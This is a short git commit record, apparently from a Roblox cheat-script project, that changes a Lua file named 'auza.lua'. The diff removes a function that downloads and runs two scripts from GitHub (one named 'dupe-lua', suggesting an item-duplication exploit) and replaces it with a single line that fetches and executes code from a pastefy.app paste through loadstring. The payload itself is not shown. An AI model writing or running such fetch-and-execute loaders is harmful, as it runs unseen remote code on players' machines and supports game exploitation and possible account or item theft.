07934fa787b188f49b87e3b46909654bab09f2d9
mrpano324 <xianbusiness333@gmail.com>
2025-09-02 19:33:35 +0800

    Update auza.lua

--- auza.lua
+++ auza.lua
@@ -1,8 +1,1 @@
-local function runLoaders()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/NOLAG-hubscript/GROWGARDEN/refs/heads/main/grow"))()
-    end)
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/NOLAG-hubscript/auza-gen-repo/refs/heads/main/dupe-lua"))()
-    end)
-end
+loadstring(game:HttpGet("https://pastefy.app/uJnMZdvh/raw"))()
